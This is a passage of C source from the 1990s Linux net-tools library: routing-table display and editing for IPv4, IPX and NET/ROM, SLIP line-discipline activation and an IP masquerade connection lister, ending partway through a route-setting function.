 *960413 {0.02} Bernd Eckenfels:	new RTACTION support
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include <stdio.h>
#include <string.h>
#include "net-support.h"
#include "pathnames.h"
#include "version.h"
#include "config.h"
#include "net-locale.h"

extern	struct aftype	unspec_aftype;
extern	struct aftype	unix_aftype;
extern	struct aftype	inet_aftype;
extern	struct aftype	ax25_aftype;
extern	struct aftype	netrom_aftype;
extern	struct aftype	ipx_aftype;
extern	struct aftype	ddp_aftype;

void
setroute_init(void)
{
#if HAVE_AFINET
	inet_aftype.rinput = INET_rinput;
#endif
#if HAVE_AFNETROM
	netrom_aftype.rinput = NETROM_rinput;
#endif
#if HAVE_AFIPX
	ipx_aftype.rinput = IPX_rinput;
#endif
#if 0
#if HAVE_AFAX25
	ax25_aftype.rinput = AX25_rinput;
#endif
#if HAVE_AFATALK
	ddp_aftype.rinput = DDP_rinput;
#endif
#endif
}


int
route_edit(int action, const char *afname, int options, char **argv)
{
  struct aftype *ap;
  
  ap = get_aftype(afname);

  if (!ap) {
	fprintf(stderr,NLS_CATGETS(catfd, netstatSet, netstat_route_no_support, "Address family `%s' not supported.\n"),afname);
	return(E_OPTERR);
  }

  if (!ap->rinput) {
	fprintf(stderr,NLS_CATGETS(catfd, netstatSet, netstat_type_no_route, "No routing for address family `%s'.\n"),ap->name);
	return(E_OPTERR);
  }

  return(ap->rinput(action, options, argv));
}
/* support for ap->rresolv missing */

#include "config.h"

#if HAVE_AFIPX
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/ipx.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include "version.h"
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"

/* UGLY */

int IPX_rprint(int options)
{
  /* int ext = options & FLAG_EXT; */
  int numeric = options & FLAG_NUM;
  char buff[1024];
  char net[128], router_net[128];
  char router_node[128];
  int num;
  FILE *fp;
  struct aftype *ap;
  struct sockaddr sa;
  
  printf(NLS_CATGETS(catfd, ipxSet, ipx_table, "Kernel IPX routing table\n")); /* xxx */

  if ((ap = get_afntype(AF_IPX)) == NULL) {
  	EINTERN("lib/ipx_rt.c","AF_IPX missing");
  	return(-1);
  }

  printf(NLS_CATGETS(catfd, ipxSet, ipx_header1,
		"Destination               Router Net                Router Node\n"));

  if ((fp = fopen(_PATH_PROCNET_IPX_ROUTE, "r")) == NULL) {
	perror(_PATH_PROCNET_IPX_ROUTE);
	return(-1);
  }

  fgets(buff, 1023, fp);
  
  while (fgets(buff, 1023, fp))
  {
	num = sscanf(buff, "%s %s %s",net,router_net,router_node);
	if (num < 3) continue;
	
	/* Fetch and resolve the Destination */
	(void)ap->input(5,net,&sa);
	strcpy(net, ap->sprint(&sa, numeric));

	/* Fetch and resolve the Router Net */
	(void)ap->input(5,router_net,&sa);
	strcpy(router_net, ap->sprint(&sa, numeric));

	/* Fetch and resolve the Router Node */
	(void)ap->input(2,router_node,&sa);
	strcpy(router_node, ap->sprint(&sa, numeric));

	printf("%-25s %-25s %-25s\n",net, router_net, router_node);
  }

  (void) fclose(fp);
  return(0);
}

#endif /* HAVE_AFIPX */
/*
 * lib/netrom_gr.c	This file contains an implementation of the NET/ROM
 *			route support functions.
 *
 * Version:	lib/netrom_gr.c 0.01 (1996-02-15)
 *
 * Author:	Bernd Eckenfels, <ecki@lina.inka.de>
 *		Copyright 1999 Bernd Eckenfels, Germany
 *		base on Code from Jonathan Naylor <jsn@Cs.Nott.AC.UK>
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include "config.h"

#if HAVE_AFNETROM
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"

/* UGLY */

int NETROM_rprint(int options)
{
	FILE *f1=fopen(_PATH_PROCNET_NR_NODES, "r");
	FILE *f2=fopen(_PATH_PROCNET_NR_NEIGH, "r");
	char buffer[256];
	int qual,n,w;
	/*int ext = options & FLAG_EXT;
	int numeric = options & FLAG_NUM;*/

	if(f1==NULL||f2==NULL)
	{
		printf(NLS_CATGETS(catfd, netstatSet, netstat_nonetrom, "NET/ROM not configured in this system.\n")); /* xxx */
		return 1;
	}
	printf(NLS_CATGETS(catfd, netstatSet, netstat_netrom, "Kernel NET/ROM routing table\n")); /* xxx */
	printf(NLS_CATGETS(catfd, netstatSet, netstat_header_netrom, "Destination  Mnemonic  Quality  Neighbour  Iface\n")); /* xxx */
	fgets(buffer,256,f1);
	while(fgets(buffer,256,f1))
	{
		buffer[9]=0;
		buffer[17]=0;
		w=atoi(buffer+19)-1;
		printf("%-9s    %-7s   ",
			buffer,buffer+10);
		qual=atoi(buffer+24+15*w);
		n=atoi(buffer+32+15*w);
		rewind(f2);
		fgets(buffer,256,f2);
		while(fgets(buffer,256,f2))
		{
			if(atoi(buffer)==n)
			{
				buffer[15]=0;
				buffer[20]=0;
				printf("%3d      %-9s  %s\n",
					qual,buffer+6,buffer+16);
				break;
			}
		}
	}
	fclose(f1);
	fclose(f2);
	return 0;
}

#endif	/* HAVE_AFNETROM */
#include "config.h"

#if HAVE_AFINET
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <linux/route.h>
#include <ctype.h>
#include <errno.h>
#include <netdb.h>
#include <resolv.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include "version.h"
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"

#include "net-features.h"

extern     struct aftype   inet_aftype;


int rprint_fib(int ext, int numeric)
{
  char buff[4096], iface[16], flags[16];
  char gate_addr[128], net_addr[128];
  char mask_addr[128];
  struct sockaddr snet, sgate, smask;
  int num, iflags, metric, refcnt, use, mss, window, irtt;
  FILE *fp=fopen(_PATH_PROCNET_ROUTE, "r");

  if (!fp) {
	ESYSNOT("getroute","INET FIB");
	return 1;
  }

  printf(NLS_CATGETS(catfd, inetSet, inet_table, "Kernel IP routing table\n"));

  if (ext == 1)
	printf(NLS_CATGETS(catfd, inetSet, inet_header1,
		"Destination     Gateway         Genmask         "
		"Flags Metric Ref    Use Iface\n"));
  if (ext == 2)
	printf(NLS_CATGETS(catfd, inetSet, inet_header2,
		"Destination     Gateway         Genmask         "
		"Flags   MSS Window  irtt Iface\n"));
  if (ext >= 3)
	printf(NLS_CATGETS(catfd, inetSet, inet_header3,
		"Destination     Gateway         Genmask         "
		"Flags Metric Ref    Use Iface    "
		"MSS   Window irtt\n"));

  irtt=0;
  window=0;
  mss=0;
  while (fgets(buff, 1023, fp))
  {
	num = sscanf(buff, "%s %s %s %X %d %d %d %s %d %d %d\n",
		iface, net_addr, gate_addr,
		&iflags, &refcnt, &use, &metric, mask_addr,
 		&mss,&window,&irtt);
	if (num < 10) continue;

	/* Fetch and resolve the target address. */
	(void)inet_aftype.input(1, net_addr, &snet);
	strcpy(net_addr, inet_aftype.sprint(&snet, (numeric | 0x8000)));
	net_addr[15] = '\0';
    
	/* Fetch and resolve the gateway address. */
	(void)inet_aftype.input(1, gate_addr, &sgate);
	strcpy(gate_addr, inet_aftype.sprint(&sgate, numeric));
	gate_addr[15] = '\0';

	/* Fetch and resolve the genmask. */
	(void)inet_aftype.input(1, mask_addr, &smask);
	strcpy(mask_addr, inet_aftype.sprint(&smask, 1));
	mask_addr[15] = '\0';

	/* Decode the flags. */
	flags[0] = '\0';
	if (iflags & RTF_UP) strcat(flags, "U");
	if (iflags & RTF_GATEWAY) strcat(flags, "G");
#if HAVE_RTF_REJECT
	if (iflags & RTF_REJECT) strcpy(flags,"!");
#endif
	if (iflags & RTF_HOST) strcat(flags, "H");
	if (iflags & RTF_REINSTATE) strcat(flags, "R");
	if (iflags & RTF_DYNAMIC) strcat(flags, "D");
	if (iflags & RTF_MODIFIED) strcat(flags, "M");
	/* Print the info. */
	if (ext == 1) {
#if HAVE_RTF_REJECT
		if (iflags & RTF_REJECT)
			printf("%-15s -               %-15s %-5s %-6d -  %7d -\n",
				net_addr,  mask_addr, flags, metric, use);
		else
#endif
			printf("%-15s %-15s %-15s %-5s %-6d %-2d %7d %s\n",
			net_addr, gate_addr, mask_addr, flags,
			metric, refcnt, use, iface);
	}
	if (ext == 2) {
#if HAVE_RTF_REJECT
		if (iflags & RTF_REJECT)
			printf("%-15s -               %-15s %-5s     - -          - -\n",
				net_addr, mask_addr, flags);
		else
#endif
			printf("%-15s %-15s %-15s %-5s %5d %-5d %6d %s\n",
				net_addr, gate_addr, mask_addr, flags,
				mss, window, irtt, iface);
	}
	if (ext >= 3) {
#if HAVE_RTF_REJECT
		if (iflags & RTF_REJECT)
			printf("%-15s -               %-15s %-5s %-6d -  %7d -        -     -      -\n",
				net_addr, mask_addr, flags, metric, use);
		else
#endif
			printf("%-15s %-15s %-15s %-5s %-6d %-3d %6d %-6.6s   %-5d %-6d %d\n",
			net_addr, gate_addr, mask_addr, flags,
			metric, refcnt, use, iface, mss, window, irtt);
	}
  }

  (void) fclose(fp);
  return(0);
}

int rprint_cache(int ext, int numeric)
{
  FILE *fp=fopen(_PATH_PROCNET_RTCACHE, "r");

  if (!fp) {
	ESYSNOT("getroute","INET CACHE");
	return 1;
  }

  printf(NLS_CATGETS(catfd, inetSet, inet_cache, "Kernel IP routing cache\n"));
  fprintf(stderr,"INET CACHE: This needs to be written!\n");
  
  (void) fclose(fp);
  return(0);
}

int INET_rprint(int options)
{
  int ext = options & FLAG_EXT;
  int numeric = options & (FLAG_NUM|FLAG_SYM);
  int rc = E_INTERN;
  
  if (options & FLAG_FIB)
	if ((rc = rprint_fib(ext,numeric)))
  		return(rc);
  if (options & FLAG_CACHE)
  	rc = rprint_cache(ext,numeric);
  
  return(rc);
}

#endif	/* HAVE_AFINET */
/*
 * lib/support.h	This file contains the definitions of what is in the
 *			support library.  Most of all, it defines structures
 *			for accessing support modules, and the function proto-
 *			types.
 *
 * NET-LIB	A collection of functions used from the base set of the
 *		NET-3 Networking Distribution for the LINUX operating
 *		system. (net-tools, net-drivers)
 *
 * Version:	lib/net-support.h 1.34 (1996-04-13)
 *
 * Maintainer:	Bernd 'eckes' Eckenfels, <net-tools@lina.inka.de>
 *
 * Author:	Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *		Copyright 1993 MicroWalt Corporation
 *
 * Modifications:
 *960125 {1.20}	Bernd Eckenfels:	reformated, layout
 *960202 {1.30} Bernd Eckenfels:	rprint in aftype
 *960206 {1.31} Bernd Eckenfels:	route_init
 *960219 {1.32} Bernd Eckenfels:	type for ap->input()
 *960322 {1.33} Bernd Eckenfels:	activate_ld and const in get_hwtype
 *960413 {1.34} Bernd Eckenfels:	new RTACTION suport
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include <sys/socket.h>

/* This structure defines protocol families and their handlers. */
struct aftype {
  char		*name;
  char		*title;
  int		af;
  int		alen;
  char		*(*print)	(unsigned char *);
  char		*(*sprint)	(struct sockaddr *, int numeric);
  int		(*input)	(int type, char *bufp, struct sockaddr *);
  void		(*herror)	(char *text);
  int		(*rprint)	(int options);
  int 		(*rinput)	(int typ, int ext, char **argv);
};


/* This structure defines hardware protocols and their handlers. */
struct hwtype {
  char		*name;
  char		*title;
  int		type;
  int		alen;
  char		*(*print)	(unsigned char *);
  char		*(*sprint)	(struct sockaddr *);
  int		(*input)	(char *, struct sockaddr *);
  int		(*activate)	(int fd);
};


extern struct hwtype	*get_hwtype(const char *name);
extern struct hwtype	*get_hwntype(int type);
extern struct aftype	*get_aftype(const char *name);
extern struct aftype	*get_afntype(int type);

extern int		getargs(char *string, char *arguments[]);

extern void		getroute_init(void);
extern void		setroute_init(void);
extern void		activate_init(void);
extern int		route_info(const char *afname, int flags);
extern int		route_edit(int action, const char *afname, int flags, char **argv);
extern int		activate_ld(const char *hwname, int fd);

#define RTACTION_ADD   1
#define RTACTION_DEL   2
#define RTACTION_HELP  3
#define RTACTION_FLUSH 4
#define RTACTION_SHOW  5

#define FLAG_EXT      3 /* AND-Mask */
#define FLAG_NUM      4
#define FLAG_SYM      8
#define FLAG_CACHE   16
#define FLAG_FIB     32
#define FLAG_VERBOSE 64
         
extern int		ip_masq_info(int numeric, int ext);

extern int	INET_rprint(int options);
extern int	DDP_rprint(int options);
extern int	IPX_rprint(int options);
extern int	NETROM_rprint(int options);
extern int	AX25_rprint(int options);

extern int	INET_rinput(int action, int flags, char **argv);
extern int	DDP_rinput(int action, int flags, char **argv);
extern int	IPX_rinput(int action, int flags, char **argv);
extern int	NETROM_rinput(int action, int flags, char **argv);
extern int	AX25_rinput(int action, int flags, char **argv);

int	aftrans_opt	(const char *arg);
void	aftrans_def	(char *tool, char *argv0, char *dflt);

char * get_sname(int socknumber, char *proto, int numeric);

extern int flag_unx;
extern int flag_ipx;
extern int flag_ax25;
extern int flag_ddp;
extern int flag_netrom;
extern int flag_inet;

extern char afname[];

#define AFTRANS_OPTS \
	{"ax25",	0,	0,	1}, \
	{"ip",		0,	0,	1}, \
	{"ipx",         0,	0,	1}, \
	{"appletalk",	0,	0,	1}, \
	{"netrom",	0,	0,	1}, \
	{"inet",	0,	0,	1}, \
	{"ddp",		0,	0,	1}, \
	{"unix",	0,	0,	1}, \
	{"tcpip",	0,	0,	1}
#define AFTRANS_CNT 9

#define EINTERN(file, text) fprintf(stderr, \
	"%s: Internal Error `%s'.\nContact: %s\n",file,text,Maintainer);

#define ENOSUPP(A,B)	fprintf(stderr, NLS_CATGETS(catfd, libSet, lib_nofeature, \
				"%s: feature `%s' not supported.\nPlease recompile `net-tools' with newer kernel source or full configuration.\n"),A,B)

#define ESYSNOT(A,B)	fprintf(stderr, NLS_CATGETS(catfd, libSet, lib_sysnot, \
				"%s: no support for `%s' on this system.\n"),A,B)

#define E_NOTFOUND	8
#define E_SOCK		7
#define E_LOOKUP	6
#define E_VERSION	5
#define E_USAGE		4
#define E_OPTERR	3
#define E_INTERN	2
#define E_NOSUPP	1

/* End of lib/support.h */
/*
 * lib/slip_ac.c	This file contains the activation for the
 *			SLIP line disciplines, called from activate_ld().
 *
 * Version:	slip.c 0.11 (1996-03-22)
 *
 * Author:	Bernd 'eckes' Eckenfels
 * 		Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *		Copyright 1993 MicroWalt Corporation
 *
 *		Modified by Alan Cox, May 94 to cover NET-3
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include "config.h"

#if HAVE_HWSLIP

#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/netdevice.h>
#include <linux/if.h>
#include <linux/if_arp.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <termios.h>
#include <unistd.h>
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"


/* Set the line discipline of a terminal line. */
static int
SLIP_set_disc(int fd, int disc)
{
  if (ioctl(fd, TIOCSETD, &disc) < 0) {
	fprintf(stderr, "SLIP_set_disc(%d): %s\n", disc, strerror(errno));
	return(-errno);
  }
  return(0);
}


/* Set the encapsulation type of a terminal line. */
static int
SLIP_set_encap(int fd, int encap)
{
  if (ioctl(fd, SIOCSIFENCAP, &encap) < 0) {
	fprintf(stderr, "SLIP_set_encap(%d): %s\n", encap, strerror(errno));
	return(-errno);
  }
  return(0);
}


/* Start the SLIP encapsulation on the file descriptor. */
int SLIP_activate(int fd)
{
  if (SLIP_set_disc(fd, N_SLIP) < 0) return(-1);
  if (SLIP_set_encap(fd, 0) < 0) return(-1);
  return(0);
}


/* Start the VJ-SLIP encapsulation on the file descriptor. */
int CSLIP_activate(int fd)
{
  if (SLIP_set_disc(fd, N_SLIP) < 0) return(-1);
  if (SLIP_set_encap(fd, 1) < 0) return(-1);
  return(0);
}


/* Start the SLIP-6 encapsulation on the file descriptor. */
int SLIP6_activate(int fd)
{
  if (SLIP_set_disc(fd, N_SLIP) < 0) return(-1);
  if (SLIP_set_encap(fd, 2) < 0) return(-1);
  return(0);
}


/* Start the VJ-SLIP-6 encapsulation on the file descriptor. */
int CSLIP6_activate(int fd)
{
  if (SLIP_set_disc(fd, N_SLIP) < 0) return(-1);
  if (SLIP_set_encap(fd, 3) < 0) return(-1);
  return(0);
}


/* Start adaptive encapsulation on the file descriptor. */
int ADAPTIVE_activate(int fd)
{
  if (SLIP_set_disc(fd, N_SLIP) < 0) return(-1);
  if (SLIP_set_encap(fd, 8) < 0) return(-1);
  return(0);
}
#endif	/* HAVE_HWSLIP */
/*
 * lib/masq_info.c	This file contains a the functio masq_info
 *			to print a table of current masquerade connections.
 *
 * NET-LIB	A collection of functions used from the base set of the
 *		NET-3 Networking Distribution for the LINUX operating
 *		system. (net-tools, net-drivers)
 *
 * Version:	lib/masq_info.c 0.02 (1996-02-18)
 *
 * Author:	Bernd 'eckes' Eckenfels <net-tools@lina.inka.de>
 *		Copyright 1999 Bernd Eckenfels, Germany
 *
 * Modifications:
 *
 *960217 {0.01} Bernd Eckenfels:	creatin from the code of
 *					Jos Vos' ipfwadm 2.0beta1
 *950218 {0.02} Bernd Eckenfels:	<linux/if.h> added
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <malloc.h>
#include <string.h>
#include <unistd.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if.h>
#include <linux/ip_fw.h>
#include "net-support.h"
#include "pathnames.h"
#include "version.h"
#include "config.h"
#include "net-locale.h"

#include "net-features.h"
#if HAVE_FW_MASQUERADE


struct masq {
	unsigned long   expires;	/* Expiration timer */
	char * 		proto;		/* Which protocol are we talking? */
	struct sockaddr_in src, dst;	/* Source and destination IP addresses */
	unsigned short  sport, dport;	/* Source and destination ports */
	unsigned short  mport;		/* Masqueraded port */
	unsigned long   initseq;	/* Add delta from this seq. on */
	short           delta;		/* Delta in sequence numbers */
	short           pdelta;         /* Delta in sequence numbers before last */
};

static struct aftype   *ap;		/* current address family	*/
static int has_pdelta;

static void
print_masq(struct masq *ms, int numeric, int ext)
{
	unsigned long minutes, seconds, sec100s;

	printf("%-4s", ms->proto);

	sec100s = ms->expires % 100L;
	seconds = (ms->expires / 100L) % 60;
	minutes = ms->expires / 6000L;

	printf("%3ld:%02ld.%02ld ", minutes, seconds, sec100s);

	if (ext>1) {
		if (has_pdelta)
			printf("%10lu %5hd %5hd ", ms->initseq,
				ms->delta, ms->pdelta);
		else
			printf("%10lu %5hd     - ", ms->initseq,
				ms->delta);
	}
	printf("%-20s ", ap->sprint((struct sockaddr *)&(ms->src),numeric));
	printf("%-20s ", ap->sprint((struct sockaddr *)&(ms->dst),numeric));

	printf("%s -> ", get_sname(ms->sport, ms->proto, numeric));
	printf("%s", get_sname(ms->dport, ms->proto, numeric));
	printf(" (%s)\n", get_sname(ms->mport, ms->proto, numeric));
}


static int
read_masqinfo(FILE *f, struct masq *mslist, int nmslist)
{
	int n, nread = 0;
	struct masq *ms;
	char buf[256];

	for (nread = 0; nread < nmslist; nread++) {
		ms = &mslist[nread];
		if (has_pdelta) {
			if ((n = fscanf(f, " %s %lX:%hX %lX:%hX %hX %lX %hd %hd %lu", 
				buf,
				(unsigned long *) &ms->src.sin_addr.s_addr, &ms->sport,
				(unsigned long *) &ms->dst.sin_addr.s_addr, &ms->dport,
				&ms->mport, &ms->initseq, &ms->delta,
				&ms->pdelta, &ms->expires)) == -1)
				return nread;
		} else {
			if ((n = fscanf(f, " %s %lX:%hX %lX:%hX %hX %lX %hd %lu", 
				buf,
				(unsigned long *) &ms->src.sin_addr.s_addr, &ms->sport,
				(unsigned long *) &ms->dst.sin_addr.s_addr, &ms->dport,
				&ms->mport, &ms->initseq, &ms->delta,
				&ms->expires)) == -1)
				return nread;
		}	
		if ((has_pdelta && (n !=10)) || (!has_pdelta && (n != 9))) {
			EINTERN("masq_info.c", "ip_masquerade format error");
			return(-1);
		}
		
		ms->src.sin_family = AF_INET;
		ms->dst.sin_family = AF_INET;
         
          	if (strcmp("TCP", buf) == 0)
			ms->proto = "tcp";
		else if (strcmp("UDP", buf) == 0)
			ms->proto = "udp";
		else {
			EINTERN("masq_info.c", "ip_masquerade unknown type");
			return(-1);
		}

		/* we always keep these addresses in network byte order */
		ms->src.sin_addr.s_addr = htonl(ms->src.sin_addr.s_addr);
		ms->dst.sin_addr.s_addr = htonl(ms->dst.sin_addr.s_addr);
		ms->sport = htons(ms->sport);
		ms->dport = htons(ms->dport);
		ms->mport = htons(ms->mport);
	}
	return nread;
}


int ip_masq_info(int numeric, int ext)
{
	FILE *f;
	int i;
	char buf[256];
	struct masq *mslist;
	int ntotal = 0, nread;

	if(!(f=fopen(_PATH_PROCNET_IP_MASQ, "r")))
	{
		if (errno != ENOENT) {
 			perror(_PATH_PROCNET_IP_MASQ);
			return(-1);
		}
		ESYSNOT("netstat","ip_masquerade");
		return(1);
	}
	
	if ((ap = get_aftype("inet")) == NULL) {
		ENOSUPP("masq_info","AF INET");
		fclose(f);
		return(-1);
	}
	
	fgets(buf, sizeof(buf), f);
        has_pdelta = strstr(buf,"PDelta")?1:0;
        
	mslist = (struct masq *) malloc(16 * sizeof(struct masq));
	if (!mslist) {
		EINTERN("masq_info","malloc() failed");
		fclose(f);
		return(-1);
	}
	while ((nread = read_masqinfo(f, &(mslist[ntotal]), 16)) == 16) {
		ntotal += nread;
		mslist = (struct masq *) realloc(mslist,
			(ntotal + 16) * sizeof(struct masq));
		if (!mslist) {
			EINTERN("masq_info","realloc() failed");
			fclose(f);
			return(-1);
		}
			
	}
	fclose(f);
	
	if (nread < 0) {
		if (mslist)
			free(mslist);
		return(-1);
	}
	
	ntotal += nread;

	if (ntotal > 0) {
		printf(NLS_CATGETS(catfd, libSet, lib_masq, "IP masquerading entries\n"));
		switch(ext) {
			case 1:
				printf(NLS_CATGETS(catfd, libSet, lib_masq_tit1, "prot   expire source               destination          ports\n"));
				break;
			default:
				printf(NLS_CATGETS(catfd, libSet, lib_masq_tit2, "prot   expire    initseq delta prevd source               destination          ports\n"));
				break;
		}
		for (i = 0; i < ntotal; i++)
			print_masq(&(mslist[i]), numeric, ext);
		if (mslist)
			free(mslist);

	}
	return 0;
}
#endif
/*
 * lib/getroute.c	This file contains a small interface function to
 *			use the AF specific print routine for the routing
 *			table.
 *
 * NET-LIB	A collection of functions used from the base set of the
 *		NET-3 Networking Distribution for the LINUX operating
 *		system. (net-tools, net-drivers)
 *
 * Version:	lib/getroute.c 1.03 (1996-04-13)
 *
 * Author:	Bernd 'eckes' Eckenfels <net-tools@lina.inka.de>
 *		Copyright 1999 Bernd Eckenfels, Germany
 *
 * Modifications:
 *
 *951020 {0.10} Bernd Eckenfels:	creation
 *960202 {0.90}	Bernd Eckenfels:	rewrite to use getaftype.
 *960204 {0.91} Bernd Eckenfels:	takes constant list of AFs
 *960206 {1.01} Bernd Eckenfels:	route_init will enable routing
 *					support in the AF handlers
 *960221 {1.02} Bernd Eckenfels:	renamed from route_info to getroute.c
 *960413 {1.03} Bernd Eckenfels:	new RTACTION support
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include <stdio.h>
#include <string.h>
#include "net-support.h"
#include "pathnames.h"
#include "version.h"
#include "config.h"
#include "net-locale.h"

extern	struct aftype	unspec_aftype;
extern	struct aftype	unix_aftype;
extern	struct aftype	inet_aftype;
extern	struct aftype	ax25_aftype;
extern	struct aftype	netrom_aftype;
extern	struct aftype	ipx_aftype;
extern	struct aftype	ddp_aftype;

void
getroute_init(void)
{
#if HAVE_AFINET
	inet_aftype.rprint = INET_rprint;
#endif
#if HAVE_AFNETROM
	netrom_aftype.rprint = NETROM_rprint;
#endif
#if HAVE_AFAX25
	ax25_aftype.rprint = AX25_rprint;
#endif
#if HAVE_AFIPX
	ipx_aftype.rprint = IPX_rprint;
#endif
#if HAVE_AFATALK
	ddp_aftype.rprint = DDP_rprint;
#endif
}

int
route_info(const char *afname, int options)
{
  struct aftype *ap;
  char *tmp1,*tmp2;
  int found=E_NOTFOUND,rc;
  char buf[256];
  
  strncpy(buf,afname,sizeof(buf));
  buf[sizeof(buf)-1]='\0';
   
  tmp1=buf;
  
  while(tmp1) {
  	
  	ap=NULL;
  	
  	if ((tmp2=index(tmp1,',')))
  		*tmp2++='\0';
  
	if (!tmp1[0]) {
		tmp1=tmp2;
		continue;
	}
  	
  	ap = get_aftype(tmp1);
  
  	if (!ap) {
		fprintf(stderr,NLS_CATGETS(catfd, netstatSet, netstat_route_no_support, "Address family `%s' not supported.\n"),tmp1);
		return(E_OPTERR);
  	}
 	tmp1=tmp2;
  
  	if (!ap->rprint) {
		fprintf(stderr,NLS_CATGETS(catfd, netstatSet, netstat_type_no_route, "No routing for address family `%s'.\n"),ap->name);
		return(E_OPTERR);
  	}
  	
  	found = 0;
  	
	if ((rc = ap->rprint(options)))
  		return(rc);
  	
  }
  return(found);
}
#include "config.h"

#if HAVE_AFINET
#include <sys/param.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <linux/route.h>
#include <sys/ioctl.h>
#include <ctype.h>
#include <errno.h>
#include <netdb.h>
#include <resolv.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include "version.h"
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"

#include "net-features.h"

#if HAVE_NEW_ADDRT
#define mask_in_addr(x) (((struct sockaddr_in *)&((x).rt_genmask))->sin_addr.s_addr)
#define full_mask(x) (x)
#else
#define mask_in_addr(x) ((x).rt_genmask)
#define full_mask(x) (((struct sockaddr_in *)&(x))->sin_addr.s_addr)
#endif

extern     struct aftype   inet_aftype;

static int skfd = -1;


static int usage(void)
{
  fprintf(stderr,"Usage: inet_route [-vF] del {-host|-net} Target [gw Gw] [metric M] [[dev] If]\n");
  fprintf(stderr,"       inet_route [-vF] add {-host|-net} Target [gw Gw] [metric M]\n");
  fprintf(stderr,"                              [netmask N] [mss Mss] [window W] [irtt I]\n");
  fprintf(stderr,"                              [mod] [dyn] [reinstate] [[dev] If]\n");
  fprintf(stderr,"       inet_route [-vF] add {-host|-net} Target [metric M] reject\n");
  fprintf(stderr,"       inet_route [-FC] flush      NOT aupported\n");
  return(E_USAGE);
}


static int INET_setroute(int action, int options, char **args)
{
  struct rtentry rt;
  char target[128], gateway[128] = "NONE", netmask[128] = "default";
  int xflag, isnet;

  xflag = 0;

  if (!strcmp(*args, "#net")) {
	xflag = 1;
	args++;
  } else if (!strcmp(*args, "#host")) {
	xflag = 2;
	args++;
  }
 
  if (*args == NULL)
	return(usage());

  strcpy(target, *args++);

  /* Clean out the RTREQ structure. */
  memset((char *) &rt, 0, sizeof(struct rtentry));

  if ((isnet = inet_aftype.input(0, target, &rt.rt_dst)) < 0) {
	inet_aftype.herror(target);
	return (1);
  }
  switch (xflag) {
	case 1:
		isnet = 1;
		break;

	case 2:
		isnet = 0;
		break;

	default:
		break;
  }

  /* Fill in the other fields. */
  rt.rt_flags = (RTF_UP | RTF_HOST);
  if (isnet)
	rt.rt_flags &= ~RTF_HOST;

  while (*args) {
	if (!strcmp(*args, "metric")) {
		int metric;

		args++;
		if (!*args || !isdigit(**args))
			return(usage());
		metric = atoi(*args);
#if HAVE_NEW_ADDRT
		rt.rt_metric = metric + 1;
#else
		ENOSUPP("inet_setroute","NEW_ADDRT (metric)");
#endif
		args++;
		continue;
	}
	if (!strcmp(*args, "netmask")) {
		struct sockaddr mask;

		args++;
		if (!*args || mask_in_addr(rt))
			return(usage());
		strcpy(netmask, *args);
		if ((isnet = inet_aftype.input(0, netmask, &mask)) < 0) {
			inet_aftype.herror(netmask);
			return (E_LOOKUP);
		}
		rt.rt_genmask = full_mask(mask);
		args++;
		continue;
	}
	if (!strcmp(*args,"gw") || !strcmp(*args,"gateway")) {
		args++;
		if (!*args)
			return(usage());
		if (rt.rt_flags & RTF_GATEWAY)
			return(usage());
		strcpy(gateway, *args);
		if ((isnet = inet_aftype.input(0, gateway, &rt.rt_gateway)) < 0) {
			inet_aftype.herror(gateway);
			return (E_LOOKUP);
		}
		if (isnet) {
			fprintf(stderr, NLS_CATGETS(catfd, routeSet, route_cant_use,
						    "route: %s: cannot use a NETWORK as gateway!\n"),
				gateway);
			return (E_OPTERR);
		}
		rt.rt_flags |= RTF_GATEWAY;
		args++;
		continue;
	}
	if (!strcmp(*args,"mss")) {
		args++;
		rt.rt_flags |= RTF_MSS;
		if(!*args)
			return(usage());
		rt.rt_mss = atoi(*args);
		args++;
